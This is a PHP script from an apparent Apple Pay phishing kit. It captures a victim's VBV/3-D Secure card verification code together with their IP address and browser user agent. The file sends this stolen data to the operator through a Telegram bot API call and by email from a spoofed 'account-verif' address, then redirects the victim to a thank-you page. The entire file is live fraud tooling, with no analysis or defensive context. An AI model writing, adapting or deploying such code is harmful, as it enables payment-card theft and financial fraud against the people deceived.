<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../config2.php';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["codevbv"]    = $_POST["codevbv"];
$message = '
<br>Code VBV : '.$_SESSION["codevbv"].'
<br>IP: '._ip().'
<br>User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject="+1 ApplePay | "._ip();
$head  = 'MIME-Version: 1.0' . "\r\n";
$head .= 'Content-type: text/html; charset="utf-8"' . "\r\n";
$head .="From: Koda <rez@account-verif.com> \r\n" .
'X-Mailer: PHP/' . phpversion();
$_SESSION['step_two']  = true;

if($tlg_send == true)
{
  $data = [
    'text' => '
[⭐️] ApplePay [⭐️]

⭐️CODE DU CON : '. $_SESSION["codevbv"].'

[🔋] Tiers [🔋]
        
⭐️ Adresse Ip : '.$_SESSION['ip'].'
⭐️ User-agent : '.$_SESSION['useragent'].'  
'
  ];
  
  file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id={$chat}&".http_build_query($data) );// Don't delete
}

if ($mail_send == true)
{
  mail($my_mail, $Subject, $msg, $head);
}
    header('location: ../merci.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
}
else
{
  header('location: ../../index.php');
} 

